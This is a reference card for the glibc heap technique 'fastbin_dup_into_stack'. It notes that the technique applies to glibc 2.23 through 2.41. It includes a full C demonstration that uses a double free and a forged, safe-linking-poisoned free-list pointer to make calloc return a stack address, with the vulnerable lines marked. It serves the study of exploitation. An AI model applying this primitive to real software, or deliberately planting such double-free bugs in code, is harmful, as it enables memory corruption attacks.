# `fastbin_dup_into_stack`

## Summary

- Family: `Duplicate Return Or Chosen Return`
- README summary: Tricking malloc into returning a nearly-arbitrary pointer by abusing the fastbin freelist.
- Core effect: steer `malloc` to a near-arbitrary address via fastbin freelist abuse.
- README applicability: `latest`
- Solver window note: `2.23 -> 2.41`

## When To Consider It

- writable fastbin `fd` and a valid target region.

## Version Groups

- `2.23 -> 2.41`.

## Version Differences

- The primitive remains stable across the retained versions: corrupt fastbin `fd` so allocation returns a chosen address.
- Tcache-era variants require neutralizing or avoiding tcache for the chosen size class.
- Safe-linking-era targets may still need extra reasoning even though the corpus retains the same family label.

## Representative Source Code

- Representative version: `glibc 2.41`

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <unistd.h>

int main()
{
	setbuf(stdout, NULL);

	printf("This file extends on fastbin_dup.c by tricking malloc into\n"
	       "returning a pointer to a controlled location (in this case, the stack).\n");

	unsigned long stack_var[4] __attribute__ ((aligned (0x10)));
	printf("The address we want calloc() to return is %p.\n", stack_var + 2);

	printf("Allocate buffers to fill up tcache and prep fastbin.\n");
	void *ptrs[7];

	for (int i=0; i<7; i++) {
		ptrs[i] = malloc(8);
	}

	printf("Allocating 3 buffers.\n");
	int *a = calloc(1,8);
	int *b = calloc(1,8);
	int *c = calloc(1,8);
	printf("1st calloc(1,8): %p\n", a);
	printf("2nd calloc(1,8): %p\n", b);
	printf("3rd calloc(1,8): %p\n", c);

	printf("Fill up tcache.\n");
	for (int i=0; i<7; i++) {
		free(ptrs[i]);
	}

	printf("Freeing the first chunk %p...\n", a);
	free(a);

	printf("If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);

	printf("So, instead, we'll free %p.\n", b);
	free(b);

	printf("Now, we can free %p again, since it's not the head of the free list.\n", a);
	/* VULNERABILITY */
	free(a);
	/* VULNERABILITY */

	printf("In order to use the free list for allocation, we'll need to empty the tcache.\n");
	printf("This is because since glibc-2.41, we can only reach fastbin by exhausting tcache first.");
	printf("Because of this patch: https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=226e3b0a413673c0d6691a0ae6dd001fe05d21cd");
	for (int i = 0; i < 7; i++) {
		ptrs[i] = malloc(8);
	}

	printf("Now the free list has [ %p, %p, %p ]. "
		"We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
	unsigned long *d = calloc(1,8);

	printf("1st calloc(1,8): %p\n", d);
	printf("2nd calloc(1,8): %p\n", calloc(1,8));
	printf("Now the free list has [ %p ].\n", a);
	printf("Now, we have access to %p while it remains at the head of the free list.\n"
		"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
		"so that calloc will think there is a free chunk there and agree to\n"
		"return a pointer to it.\n", a);
	puts("Note that this is only needed for calloc. It is not needed for malloc.");
	stack_var[1] = 0x20;

	printf("Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
	printf("Notice that the stored value is not a pointer but a poisoned value because of the safe linking mechanism.\n");
	printf("^ Reference: https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/\n");
	unsigned long ptr = (unsigned long)stack_var+0x10;
	unsigned long addr = (unsigned long) d;
	/*VULNERABILITY*/
	*d = (addr >> 12) ^ ptr;
	/*VULNERABILITY*/

	printf("3rd calloc(1,8): %p, putting the stack address on the free list\n", calloc(1,8));

	void *p = calloc(1, 8);

	printf("4th calloc(1,8): %p\n", p);
	assert((unsigned long)p == (unsigned long)stack_var+0x10);
}
```

## Related Techniques

- `fastbin_dup`
- `fastbin_dup_consolidate`
- `house_of_botcake`
- `house_of_io`
- `house_of_spirit`
- `tcache_house_of_spirit`
- `tcache_metadata_poisoning`
- `tcache_poisoning`
